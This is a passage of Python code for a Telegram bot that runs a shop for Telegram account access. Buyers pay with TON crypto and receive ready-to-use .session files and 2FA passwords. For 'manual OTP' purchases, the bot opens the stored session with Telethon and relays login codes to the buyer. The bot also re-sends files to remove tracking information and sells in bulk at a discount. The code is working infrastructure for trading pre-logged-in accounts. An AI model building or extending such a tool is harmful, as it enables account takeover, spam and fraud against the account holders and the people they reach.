    context.user_data.pop('bulk_country', None)
    context.user_data.pop('bulk_base_price', None)
    
    keyboard = [
        [InlineKeyboardButton("🛒 Buy Numbers", callback_data='buy_numbers')],
        [InlineKeyboardButton("📋 Main Menu", callback_data='show_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "❌ Bulk purchase cancelled.",
        reply_markup=reply_markup
    )
    return ConversationHandler.END

async def process_bulk_purchase(query, country, quantity, context):
    """Process bulk session purchase - WITH NEW DISCOUNTS"""
    await query.edit_message_text("⏳ Processing bulk purchase...")
    
    user_id = query.from_user.id
    
    try:
        # Get user balance
        user = User.get_by_telegram_id(user_id)
        if not user:
            await query.edit_message_text("❌ User not found")
            return
        
        # Get available sessions
        sessions = TelegramSession.get_available_by_country(country, limit=quantity)
        
        if len(sessions) < quantity:
            await query.edit_message_text(
                f"❌ Not enough sessions available!\n\n"
                f"Requested: {quantity}\n"
                f"Available: {len(sessions)}"
            )
            return
        
        # ✅ UPDATED DISCOUNT CALCULATION
        base_price = sessions[0]['price']
        if quantity >= 10:
            unit_price = base_price * 0.90  # 10% off
            discount_percent = 10
        elif quantity >= 5:
            unit_price = base_price * 0.95  # 5% off
            discount_percent = 5
        else:
            unit_price = base_price
            discount_percent = 0
        
        total_cost = unit_price * quantity
        savings = (base_price * quantity) - total_cost
        
        # Check balance
        if user['balance'] < total_cost:
            await query.edit_message_text(
                f"❌ Insufficient balance!\n\n"
                f"Total cost: ${total_cost:.2f}\n"
                f"Your balance: ${user['balance']:.2f}\n"
                f"Need: ${total_cost - user['balance']:.2f} more"
            )
            return
        
        # Process each session
        purchased_sessions = []
        for session in sessions[:quantity]:
            result, error = await purchase_session(user_id, str(session['_id']), 'session')
            if result:
                purchased_sessions.append(result)
        
        if len(purchased_sessions) != quantity:
            await query.edit_message_text(
                f"⚠️ Partial success!\n\n"
                f"Purchased: {len(purchased_sessions)}/{quantity}\n"
                f"Some sessions failed. Contact support."
            )
            return
        
        # Get updated balance
        updated_user = User.get_by_telegram_id(user_id)
        
        keyboard = [
            [InlineKeyboardButton("📦 My Purchases", callback_data='my_purchases')],
            [InlineKeyboardButton("🛒 Buy More", callback_data='buy_numbers')],
            [InlineKeyboardButton("« Main Menu", callback_data='back_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        discount_text = f"🎉 {discount_percent}% Discount Applied!\n" if discount_percent > 0 else ""
        
        await query.edit_message_text(
            f"✅ Bulk Purchase Successful!\n\n"
            f"📦 Quantity: {quantity} sessions\n"
            f"🌍 Country: {country}\n"
            f"💰 Total Paid: ${total_cost:.2f}\n"
            f"{discount_text}"
            f"💵 You Saved: ${savings:.2f}\n"
            f"💳 New Balance: ${updated_user['balance']:.2f}\n\n"
            f"📂 Sending session files...",
            reply_markup=reply_markup
        )
        
        # Send all session files
        for idx, session_result in enumerate(purchased_sessions, 1):
            try:
                message_id = int(session_result['session_string'])
                
                # Forward file
                await context.bot.forward_message(
                    chat_id=user_id,
                    from_chat_id=config.STORAGE_CHANNEL_ID,
                    message_id=message_id
                )
                
                # Send info
                phone = session_result['phone'].replace('`', '').replace('*', '')
                info_text = f"✅ Session {idx}/{quantity}\n📱 {phone}"
                if session_result.get('has_2fa'):
                    info_text += f"\n🔐 2FA: {session_result['two_fa_password']}"
                
                await context.bot.send_message(user_id, info_text)
                
                await asyncio.sleep(1)
                
            except Exception as e:
                logger.error(f"Error sending session {idx}: {e}")
        
        await context.bot.send_message(
            user_id,
            f"🎉 All {quantity} sessions delivered!\n\n"
            f"Thank you for your bulk purchase! 🙏"
        )
        
    except Exception as e:
        logger.error(f"Bulk purchase error: {e}")
        import traceback
        traceback.print_exc()
        await query.edit_message_text(f"❌ Error: {str(e)}")

async def show_country_selection(query, purchase_type):
    """Show available countries - CLEAN DISPLAY (NO INFO ON BUTTONS)"""
    try:
        countries = TelegramSession.get_available_countries()
        
        if not countries:
            keyboard = [[InlineKeyboardButton("« Back", callback_data='back_buy')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "❌ No sessions available at the moment.\n\n"
                "Please check back later or contact support.",
                reply_markup=reply_markup
            )
            return
        
        keyboard = []
        for country_data in countries:
            country = country_data['_id']
            count = country_data['count']
            price = country_data['min_price']
            
            # ✅ CLEAN BUTTON - Only country, price, and count
            btn_text = f"🌍 {country} - ${price:.2f} ({count} available)"
            
            keyboard.append([InlineKeyboardButton(
                btn_text, 
                callback_data=f'country_{purchase_type}_{country}'
            )])
        
        keyboard.append([InlineKeyboardButton("« Back", callback_data='back_buy')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        type_text = "📱 Sessions" if purchase_type == 'session' else "📲 Manual OTP"
        
        await query.edit_message_text(
            f"{type_text} - Select Country\n\n"
            f"💡 Extra info will be shown in session details\n"
            f"Choose a country to see available numbers:",
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.error(f"Country selection error: {e}")
        import traceback
        traceback.print_exc()
        await query.edit_message_text("❌ Error loading countries")

async def show_sessions_by_country(query, country, purchase_type, page=0):
    """Show sessions for specific country - INFO IN HEADER ONLY"""
    try:
        ITEMS_PER_PAGE = 10
        
        all_sessions = TelegramSession.get_available_by_country(country, limit=100)
        
        if not all_sessions:
            keyboard = [[InlineKeyboardButton("« Back", callback_data='back_country')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                f"❌ No {country} sessions available right now.\n\n"
                f"Please check back later or try another country.",
                reply_markup=reply_markup
            )
            return
        
        total_sessions = len(all_sessions)
        total_pages = (total_sessions + ITEMS_PER_PAGE - 1) // ITEMS_PER_PAGE
        
        # Count 2FA
        sessions_with_2fa = sum(1 for s in all_sessions if s.get('has_2fa'))
        
        start_idx = page * ITEMS_PER_PAGE
        end_idx = start_idx + ITEMS_PER_PAGE
        sessions = all_sessions[start_idx:end_idx]
        
        # Collect unique info from all sessions
        unique_info = set()
        for session in all_sessions:
            if session.get('info'):
                unique_info.add(session['info'])
        
        keyboard = []
        callback_prefix = 'buy_session' if purchase_type == 'session' else 'buy_manual'
        
        # ✅ CLEAN BUTTONS - Only phone, price, 2FA indicator
        for session in sessions:
            phone_display = session.get('phone_number') or 'Hidden'
            if session.get('phone_number') and len(session['phone_number']) > 4:
                phone_display = f"****{session['phone_number'][-4:]}"
            
            # Simple button text
            btn_text = f"📱 {phone_display} - ${session['price']:.2f}"
            if session.get('has_2fa'):
                btn_text += " 🔐"
            
            keyboard.append([InlineKeyboardButton(
                btn_text, 
                callback_data=f'{callback_prefix}_{str(session["_id"])}'
            )])
        
        # Pagination buttons
        nav_buttons = []
        
        if page > 0:
            nav_buttons.append(InlineKeyboardButton(
                "⬅️ Previous", 
                callback_data=f'page_{purchase_type}_{country}_{page-1}'
            ))
        
        if page < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton(
                "Next ➡️", 
                callback_data=f'page_{purchase_type}_{country}_{page+1}'
            ))
        
        if nav_buttons:
            keyboard.append(nav_buttons)
        
        keyboard.append([InlineKeyboardButton("« Back", callback_data='back_country')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        type_text = "📱 Sessions" if purchase_type == 'session' else "📲 Manual OTP"
        
        # ✅ BUILD HEADER WITH ALL INFO
        header = (
            f"{type_text} - {country}\n\n"
            f"📊 Total: {total_sessions} numbers\n"
            f"📄 Page {page + 1}/{total_pages}\n"
            f"🔐 With 2FA: {sessions_with_2fa}\n"
            f"💰 Prices in USD\n\n"
            "Select a number to purchase:"
        )
        
        await query.edit_message_text(header, reply_markup=reply_markup)
    except Exception as e:
        logger.error(f"Sessions by country error: {e}")
        import traceback
        traceback.print_exc()
        await query.edit_message_text("❌ Error loading sessions")
        

async def process_session_purchase(query, user_id, session_id, context):
    """
    Process session purchase - WITH ADMIN NOTIFICATION
    """
    await query.edit_message_text("⏳ Processing your purchase...")
    
    result, error = await purchase_session(user_id, session_id, 'session')
    
    if error:
        keyboard = [[InlineKeyboardButton("« Back", callback_data='buy_sessions')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"❌ Purchase Failed\n\n{error}",
            reply_markup=reply_markup
        )
        return
    
    keyboard = [
        [InlineKeyboardButton("📦 My Purchases", callback_data='my_purchases')],
        [InlineKeyboardButton("🛒 Buy More", callback_data='buy_numbers')],
        [InlineKeyboardButton("« Main Menu", callback_data='back_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Clean data for display
    phone = result['phone'].replace('`', '').replace('*', '').replace('_', '')
    country = result['country'].replace('`', '').replace('*', '').replace('_', '')
    
    # Success message
    message = (
        "✅ Session Purchase Successful!\n\n"
        f"📱 Phone: {phone}\n"
        f"🌍 Country: {country}\n"
    )
    
    if result['has_2fa']:
        two_fa = result['two_fa_password'].replace('`', '').replace('*', '').replace('_', '')
        message += f"🔐 2FA Password: {two_fa}\n\n"
    else:
        message += "\n"
    
    message += "📂 Sending session file..."
    
    await query.edit_message_text(
        message,
        reply_markup=reply_markup
    )
    
    # Send session file WITHOUT caption (remove tracking info)
    try:
        message_id = int(result['session_string'])
        
        logger.info(f"📤 Downloading file from storage and sending clean to user {user_id}")
        
        # Get the message from storage channel (not forwarding to user)
        channel_message = await context.bot.forward_message(
            chat_id=config.OWNER_ID,  # Forward to admin temporarily, not user
            from_chat_id=config.STORAGE_CHANNEL_ID,
            message_id=message_id
        )
        
        # Get the file from the forwarded message
        file = await channel_message.document.get_file()
        
        # Download the file
        import tempfile
        import os
        
        with tempfile.NamedTemporaryFile(suffix='.session', delete=False) as temp_file:
            temp_path = temp_file.name
            await file.download_to_drive(temp_path)
        
        # Delete the forwarded message from admin chat
        try:
            await context.bot.delete_message(
                chat_id=config.OWNER_ID,
                message_id=channel_message.message_id
            )
        except:
            pass
        
        # Send the file fresh WITHOUT caption to user
        with open(temp_path, 'rb') as f:
            await context.bot.send_document(
                chat_id=user_id,
                document=f,
                filename=f"{phone}.session"
            )
        
        # Clean up temp file
        try:
            os.unlink(temp_path)
        except:
            pass
        
        # Send info message
        info_text = (
            "✅ Session File Delivered!\n\n"
            f"📱 Phone: {phone}\n"
            f"🌍 Country: {country}\n"
        )
        
        if result['has_2fa']:
            info_text += f"🔐 2FA: {two_fa}\n\n"
        else:
            info_text += "✅ No 2FA\n\n"
        
        info_text += (
            "How to use:\n"
            "1. Download the .session file above\n"
            "2. Rename it (e.g., 'my_account.session')\n"
            "3. Use it with Telethon\n"
            "4. Connect - you're logged in!\n\n"
            "⚠️ Keep this file secure!"
        )
        
        await context.bot.send_message(
            chat_id=user_id,
            text=info_text
        )
        
        logger.info(f"✅ Session sent successfully to user {user_id}")
        
        # ============================================
        # 🔔 NOTIFY ADMIN OF PURCHASE
        # ============================================
        try:
            # Get user info
            user = User.get_by_telegram_id(user_id)
            username = user.get('username', 'Unknown')
            balance = user['balance']
            
            # Get session price
            session = TelegramSession.get_by_id(session_id)
            price = session['price'] if session else 0.0
            
            admin_notification = (
                "🔔 **NEW SESSION PURCHASE**\n\n"
                f"👤 User: @{username} (`{user_id}`)\n"
                f"📱 Phone: `{phone}`\n"
                f"🌍 Country: {country}\n"
                f"💰 Price: ${price:.2f}\n"
                f"💳 New Balance: ${balance:.2f}\n"
                f"🔐 2FA: {'Yes' if result['has_2fa'] else 'No'}\n"
                f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            )
            
            await context.bot.send_message(
                chat_id=config.OWNER_ID,
                text=admin_notification,
                parse_mode='Markdown'
            )
            
            logger.info(f"✅ Admin notified of purchase by user {user_id}")
            
        except Exception as e:
            logger.error(f"❌ Failed to notify admin: {e}")
        
    except Exception as e:
        logger.error(f"❌ Error forwarding session: {e}")
        import traceback
        traceback.print_exc()
        
        error_msg = str(e).replace('`', '').replace('*', '').replace('_', '')
        
        await context.bot.send_message(
            chat_id=user_id,
            text=(
                f"❌ Error Sending Session File\n\n"
                f"Error: {error_msg}\n\n"
                f"Please contact support: @Akash_support_bot"
            )
        )

# Replace the process_manual_purchase function in bot.py with this:

async def process_manual_purchase(query, user_id, session_id, context):
    """Process manual OTP purchase - WITH ADMIN NOTIFICATION"""
    await query.edit_message_text("⏳ Processing your purchase...")
    
    result, error = await purchase_session(user_id, session_id, 'manual')
    
    if error:
        keyboard = [[InlineKeyboardButton("« Back", callback_data='buy_manual_otp')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"❌ Purchase Failed\n\n{error}",
            reply_markup=reply_markup
        )
        return
    
    keyboard = [
        [InlineKeyboardButton("📦 My Purchases", callback_data='my_purchases')],
        [InlineKeyboardButton("🛒 Buy More", callback_data='buy_numbers')],
        [InlineKeyboardButton("« Main Menu", callback_data='back_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = (
        "✅ Manual OTP Purchase Successful!\n\n"
        f"📱 Phone: {result['phone']}\n"
        f"🌍 Country: {result['country']}\n"
    )
    
    if result['has_2fa']:
        message += f"🔐 2FA Password: {result['two_fa_password']}\n\n"
    else:
        message += "\n"
    
    message += (
        "📞 To get OTP:\n"
        "1. Open Telegram app\n"
        "2. Enter this phone number\n"
        "3. Wait for login code\n\n"
        "⏳ Requesting OTP now...\n"
        "Please wait up to 5 minutes."
    )
    
    await query.edit_message_text(
        message,
        reply_markup=reply_markup
    )
    
    # ============================================
    # 🔔 NOTIFY ADMIN OF MANUAL OTP PURCHASE
    # ============================================
    try:
        user = User.get_by_telegram_id(user_id)
        username = user.get('username', 'Unknown')
        balance = user['balance']
        
        session = TelegramSession.get_by_id(session_id)
        price = session['price'] if session else 0.0
        
        admin_notification = (
            "🔔 **NEW MANUAL OTP PURCHASE**\n\n"
            f"👤 User: @{username} (`{user_id}`)\n"
            f"📱 Phone: `{result['phone']}`\n"
            f"🌍 Country: {result['country']}\n"
            f"💰 Price: ${price:.2f}\n"
            f"💳 New Balance: ${balance:.2f}\n"
            f"🔐 2FA: {'Yes' if result['has_2fa'] else 'No'}\n"
            f"⏳ OTP Listener: Starting...\n"
            f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
        )
        
        await context.bot.send_message(
            chat_id=config.OWNER_ID,
            text=admin_notification,
            parse_mode='Markdown'
        )
        
        logger.info(f"✅ Admin notified of manual purchase by user {user_id}")
        
    except Exception as e:
        logger.error(f"❌ Failed to notify admin: {e}")
    
    await asyncio.sleep(2)
    
    otp_msg = await context.bot.send_message(
        chat_id=user_id,
        text=(
            "⏳ Fetching OTP Code\n\n"
            f"📱 Phone: {result['phone']}\n"
            f"🌍 Country: {result['country']}\n\n"
            "Connecting to Telegram...\n"
            "This may take up to 5 minutes."
        )
    )
    
    # Start OTP listener (non-blocking)
    try:
        message_id = int(result['session_string'])
        
        logger.info(f"📥 Downloading session file from message {message_id}")
        
        file_msg = await context.bot.forward_message(
            chat_id=config.OWNER_ID,
            from_chat_id=config.STORAGE_CHANNEL_ID,
            message_id=message_id
        )
        
        file = await file_msg.document.get_file()
        
        import tempfile
        import os
        
        with tempfile.NamedTemporaryFile(suffix='.session', delete=False) as temp_file:
            temp_path = temp_file.name
            await file.download_to_drive(temp_path)
        
        logger.info(f"✅ Session file downloaded to {temp_path}")
        
        try:
            await context.bot.delete_message(
                chat_id=config.OWNER_ID,
                message_id=file_msg.message_id
            )
        except:
            pass
        
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        
        session_name = temp_path.replace('.session', '')
        
        logger.info(f"🔄 Converting to string session...")
        
        client = TelegramClient(
            session_name,
            config.TELEGRAM_API_ID,
            config.TELEGRAM_API_HASH
        )
        
        await client.connect()
        string_session = StringSession.save(client.session)
        logger.info(f"✅ String session created (length: {len(string_session)})")
        
        await client.disconnect()
        
        try:
            os.remove(temp_path)
            if os.path.exists(f"{temp_path}-journal"):
                os.remove(f"{temp_path}-journal")
        except Exception as e:
            logger.debug(f"Cleanup: {e}")
        
        logger.info(f"📞 Starting OTP listener for user {user_id}...")
        
        otp_result = await asyncio.wait_for(
            get_otp_from_session(
                string_session,
                result['phone'],
                user_id,
                context.bot
            ),
            timeout=305.0
        )
        
        if otp_result['success']:
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=otp_msg.message_id,
                text=(
                    "✅ OTP Request Successful!\n\n"
                    f"📱 Phone: {result['phone']}\n"
                    f"🌍 Country: {result['country']}\n\n"
                    "🔑 Check your messages above for the OTP code!\n\n"
                    "The login code has been sent to you automatically.\n\n"
                    "Next Steps:\n"
                    "1. Open Telegram app\n"
                    "2. Enter the phone number\n"
                    "3. Enter the OTP code we sent\n"
                    "4. Enter 2FA password if prompted"
                )
            )
        else:
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=otp_msg.message_id,
                text=(
                    "⚠️ OTP Status\n\n"
                    f"📱 Phone: {result['phone']}\n"
                    f"🌍 Country: {result['country']}\n"
                    f"{'🔐 2FA: ' + result['two_fa_password'] if result['has_2fa'] else ''}\n\n"
                    f"Status: {otp_result['message']}\n\n"
                    "Possible reasons:\n"
                    "• OTP not received yet (wait 1-2 min)\n"
                    "• Session temporarily busy\n"
                    "• Rate limit from Telegram\n\n"
                    "What to do:\n"
                    "1. Try logging in manually with this phone\n"
                    "2. Request OTP from Telegram app\n"
                    "3. Check if you receive the code\n\n"
                    "Contact @Akash_support_bot if issue persists"
                )
            )
            
    except asyncio.TimeoutError:
        logger.error(f"⏰ OTP request timeout for user {user_id}")
        
        await context.bot.edit_message_text(
            chat_id=user_id,
            message_id=otp_msg.message_id,
            text=(
                "⏰ Request Timeout\n\n"
                f"📱 Phone: {result['phone']}\n"
                f"🌍 Country: {result['country']}\n"
                f"{'🔐 2FA: ' + result['two_fa_password'] if result['has_2fa'] else ''}\n\n"
                "The OTP request took too long.\n\n"
                "You can still login manually:\n"
                f"1. Open Telegram app\n"
                f"2. Enter: {result['phone']}\n"
                f"3. Request login code\n"
                f"4. Enter the code you receive\n"
                f"5. Enter 2FA password if asked\n\n"
                "Contact @Akash_support_bot for help"
            )
        )
        
    except Exception as e:
        logger.error(f"❌ Error in manual OTP: {e}")
        import traceback
        traceback.print_exc()
        
        await context.bot.edit_message_text(
            chat_id=user_id,
            message_id=otp_msg.message_id,
            text=(
                "❌ Error Occurred\n\n"
                f"📱 Phone: {result['phone']}\n"
                f"🌍 Country: {result['country']}\n"
                f"{'🔐 2FA: ' + result['two_fa_password'] if result['has_2fa'] else ''}\n\n"
                f"Error: {str(e)}\n\n"
                "Login manually:\n"
                "1. Open Telegram\n"
                "2. Enter this phone number\n"
                "3. Use the OTP you receive\n"
                "4. Enter 2FA if needed\n\n"
                "@Akash_support_bot"
            )
        )

async def show_my_purchases(query, user_id, page=0):
    """Show user's purchase history - WITH PAGINATION (10 per page)"""
    try:
        ITEMS_PER_PAGE = 10
        
        # Get all purchases
        all_purchases = await get_user_purchases(user_id)
        
        if not all_purchases:
            keyboard = [
                [InlineKeyboardButton("🛒 Buy Numbers", callback_data='buy_numbers')],
                [InlineKeyboardButton("« Back", callback_data='back_menu')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "📦 No purchases yet.\n\n"
                "Start by purchasing a session or manual OTP number!",
                reply_markup=reply_markup
            )
            return
        
        total_purchases = len(all_purchases)
        total_pages = (total_purchases + ITEMS_PER_PAGE - 1) // ITEMS_PER_PAGE
        
        # Get purchases for current page
        start_idx = page * ITEMS_PER_PAGE
        end_idx = start_idx + ITEMS_PER_PAGE
        purchases = all_purchases[start_idx:end_idx]
        
        message = f"📦 Your Purchases (Page {page + 1}/{total_pages})\n\n"
        
        for i, purchase in enumerate(purchases, start=start_idx + 1):
            message += f"{i}. 📱 {purchase.phone_number}\n"
            message += f"   🌍 {purchase.country}\n"
            message += f"   📅 {purchase.purchased_at.strftime('%Y-%m-%d %H:%M')}\n"
            message += f"   Type: {purchase.purchase_type.title()}\n"
            if purchase.has_2fa:
                message += f"   🔐 2FA: `{purchase.two_fa_password}`\n"
            message += "\n"
        
        message += f"Total purchases: {total_purchases}\n\n"
        message += "⚠️ Session strings not shown here for security.\n"
        message += "Contact support if you need session recovery."
        
        # Build keyboard with pagination
        keyboard = []
        
        # Pagination row
        nav_row = []
        if page > 0:
            nav_row.append(InlineKeyboardButton(
                "⬅️ Previous",
                callback_data=f'purchases_page_{page-1}'
            ))
        
        nav_row.append(InlineKeyboardButton(
            f"📄 {page + 1}/{total_pages}",
            callback_data='none'
        ))
        
        if page < total_pages - 1:
            nav_row.append(InlineKeyboardButton(
                "Next ➡️",
                callback_data=f'purchases_page_{page+1}'
            ))
        
        if len(nav_row) > 1:  # Only add if there's pagination
            keyboard.append(nav_row)
        
        keyboard.append([InlineKeyboardButton("🛒 Buy More", callback_data='buy_numbers')])
        keyboard.append([InlineKeyboardButton("« Back", callback_data='back_menu')])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Show purchases error: {e}")
        import traceback
        traceback.print_exc()
        await query.edit_message_text("❌ Error loading purchases")

async def show_profile(query, user_id):
    """Show user profile - FIXED FOR MONGODB"""
    try:
        user = User.get_by_telegram_id(user_id)
        purchases_count = Purchase.count_by_user(user_id)
        
        keyboard = [[InlineKeyboardButton("« Back", callback_data='back_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"👤 Your Profile\n\n"
            f"Username: @{user.get('username') if user.get('username') else 'N/A'}\n"
            f"User ID: `{user['telegram_id']}`\n"
            f"Balance: ${user['balance']:.2f} USD\n"
            f"Total Purchases: {purchases_count}\n"
            f"Member since: {user['created_at'].strftime('%Y-%m-%d')}",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Profile error: {e}")
        await query.edit_message_text("❌ Error loading profile")

async def show_support(query):
    """Show support contact"""
    keyboard = [
        [InlineKeyboardButton("📱 Contact Support", url="https://t.me/Akash_support_bot")],
        [InlineKeyboardButton("« Back", callback_data='back_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "💬 Support & Help\n\n"
        "For any queries or issues:\n"
        "📱 Contact: @Akash_support_bot\n\n"
        "💰 For old aged accounts:\n"
        "📱 Contact: @Akash_support_bot\n\n"
        "We're here to help you 24/7!",
        reply_markup=reply_markup
    )

async def show_main_menu(query):
    """Show main menu"""
    keyboard = [
        [
            InlineKeyboardButton("💰 Balance", callback_data='balance'),
            InlineKeyboardButton("💳 Deposit", callback_data='deposit')
        ],
        [
            InlineKeyboardButton("🛒 Buy Numbers", callback_data='buy_numbers'),
            InlineKeyboardButton("👤 Profile", callback_data='profile')
        ],
        [
            InlineKeyboardButton("📦 My Purchases", callback_data='my_purchases'),
            InlineKeyboardButton("💬 Support", callback_data='support')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "📋 Main Menu\n\n"
        "Select an option:",
        reply_markup=reply_markup
    )

async def admin_verify_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Verify payment"""
    user_id = update.effective_user.id
    
    if user_id != config.OWNER_ID:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    try:
        # Get transaction ID from command
        if not context.args:
            await update.message.reply_text("❌ Usage: /admin_verify_payment <transaction_id>")
            return
        
        transaction_id = context.args[0]
        
        await update.message.reply_text(f"🔍 Verifying transaction: {transaction_id}...")
        
        # Use MongoDB version
        from payment_ton import get_ton_payment
        from bson.objectid import ObjectId
        from database import get_db
        
        ton = get_ton_payment()
        
        # MongoDB: Try to find transaction by ObjectId or numeric ID
        database = get_db()
        transaction = None
        
        try:
            # Try as ObjectId first
            if len(transaction_id) == 24:
                obj_id = ObjectId(transaction_id)
                transaction = database.transactions.find_one({'_id': obj_id})
        except:
            pass
        
        # If not found, try as numeric ID
        if not transaction:
            try:
                numeric_id = int(transaction_id)
                transaction = database.transactions.find_one({'_id': numeric_id})
            except:
                pass
        
        if not transaction:
            await update.message.reply_text(f"❌ Transaction {transaction_id} not found")
            return
        
        if transaction['status'] == 'completed':
            await update.message.reply_text(f"✅ Transaction already completed")
            return
        
        # Verify the payment
        result = await ton.verify_and_credit_payment(transaction_id)
        
        if result:
            # Get updated user balance
            from database import User
            user = User.get_by_telegram_id(transaction['user_id'])
            
            response = f"✅✅✅ PAYMENT VERIFIED!\n\n"
            response += f"Transaction: {transaction_id}\n"
            response += f"User: {transaction['user_id']}\n"
            response += f"Amount: ${transaction['amount']}\n"
            response += f"New Balance: ${user['balance']:.2f}"
            
            await update.message.reply_text(response)
        else:
            await update.message.reply_text(f"❌ Payment not found on blockchain or verification failed")
            
    except Exception as e:
        logger.error(f"Verify error: {e}")
        import traceback
        traceback.print_exc()
        await update.message.reply_text(f"❌ Error: {str(e)}")
async def admin_credit_ton(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Manually credit TON payment after blockchain verification"""
    user_id = update.effective_user.id
    
    if user_id != config.OWNER_ID:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    try:
        # Usage: /admin_credit_ton <user_id> <amount> <tx_hash>
        if len(context.args) < 3:
            await update.message.reply_text(
                "❌ Usage: /admin_credit_ton <user_id> <amount> <tx_hash>\n\n"
                "Example: /admin_credit_ton 1377923423 1.00 abc123def456"
            )
            return
        
        target_user_id = int(context.args[0])
        amount = float(context.args[1])
        tx_hash = context.args[2]
        
        from database import User, Transaction, get_db
        
        # Check if user exists
        user = User.get_by_telegram_id(target_user_id)
        if not user:
            await update.message.reply_text(f"❌ User {target_user_id} not found")
            return
        
        # Create completed transaction record
        database = get_db()
        transaction_id = Transaction.create(
            user_id=target_user_id,
            amount=amount,
            payment_method='ton',
            payment_id=f"manual_{tx_hash}"
        )
        
        # Update transaction to completed
        Transaction.update_status(
            transaction_id,
            'completed',
            charge_id=tx_hash
        )
        
        # Credit user balance
        success = User.update_balance(target_user_id, amount, operation='add')
        
        if success:
            # Get updated balance
            user = User.get_by_telegram_id(target_user_id)
            
            response = f"✅✅✅ MANUAL CREDIT SUCCESS!\n\n"
            response += f"User: {target_user_id}\n"
            response += f"Amount: ${amount}\n"
            response += f"TX Hash: {tx_hash}\n"
            response += f"New Balance: ${user['balance']:.2f}\n"
            response += f"Transaction ID: {transaction_id}"
            
            await update.message.reply_text(response)
            
            # Notify user
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=f"✅ Your TON payment of ${amount} has been confirmed!\n\n"
                         f"New Balance: ${user['balance']:.2f}\n"
                         f"TX: {tx_hash[:16]}..."
                )
            except:
                pass
        else:
            await update.message.reply_text(f"❌ Failed to credit balance")
            
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid input: {str(e)}")
    except Exception as e:
        logger.error(f"Manual credit error: {e}")
        import traceback
        traceback.print_exc()
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def admin_pending_ton(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show pending TON payments - MongoDB FIXED"""
    user_id = update.effective_user.id
    
    if user_id != config.OWNER_ID:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    try:
        from bson.objectid import ObjectId
        
        database = get_db()  # ✅ Returns MongoDB database object
        time_limit = datetime.utcnow() - timedelta(hours=24)
        
        # ✅ MongoDB query syntax
        pending = list(database.transactions.find({
            'status': 'pending',
            'payment_method': 'ton',
            'created_at': {'$gte': time_limit}
        }).sort('created_at', -1))
        
        if not pending:
            await update.message.reply_text("✅ No pending TON payments in the last 24 hours")
            return
        
        response_lines = [f"📋 Pending TON Payments: {len(pending)}\n"]
        
        for tx in pending:
            tx_id = str(tx['_id'])  # ✅ MongoDB ObjectId as string
            user_id_str = str(tx['user_id'])
            amount = f"{tx['amount']:.2f}"
            payment_id = tx.get('payment_id', 'N/A')
            created = tx['created_at'].strftime('%Y-%m-%d %H:%M') if tx.get('created_at') else "N/A"
            
            response_lines.append("━━━━━━━━━━━━━━━━━━━")
            response_lines.append(f"ID: {tx_id}")
            response_lines.append(f"User: {user_id_str}")
            response_lines.append(f"Amount: ${amount}")
            response_lines.append(f"Memo: {payment_id}")
            response_lines.append(f"Created: {created}\n")
        
        response_lines.append("\n💡 To manually credit:")
        response_lines.append("/credit_ton <transaction_id>")
        
        response_text = "\n".join(response_lines)
        await update.message.reply_text(response_text)
        
    except Exception as e:
        logger.error(f"Error in admin_pending_ton: {e}")
        import traceback
        traceback.print_exc()
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def admin_credit_ton_manual(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Manually credit a TON payment - ADMIN ONLY"""
    user_id = update.effective_user.id
    
    if user_id != config.OWNER_ID:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    # Check arguments
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ Usage: /credit_ton <transaction_id>\n\n"
            "Example: /credit_ton 675b1234567890abcdef1234\n\n"
            "Use /pending_ton to see pending transactions"
        )
        return
    
    transaction_id = context.args[0]
    
    try:
        from bson.objectid import ObjectId
        
        database = get_db()
        
        # Get transaction
        try:
            obj_id = ObjectId(transaction_id)
            transaction = database.transactions.find_one({'_id': obj_id})
        except Exception:
            await update.message.reply_text("❌ Invalid transaction ID format")
            return
        
        if not transaction:
            await update.message.reply_text(f"❌ Transaction not found: {transaction_id}")
            return
        
        if transaction['status'] == 'completed':
            await update.message.reply_text("⚠️ This transaction is already completed!")
            return
        
        # Show confirmation
        keyboard = [
            [InlineKeyboardButton("✅ Credit Now", callback_data=f'admin_credit_confirm_{transaction_id}')],
            [InlineKeyboardButton("❌ Cancel", callback_data='admin_cancel')]
        ]
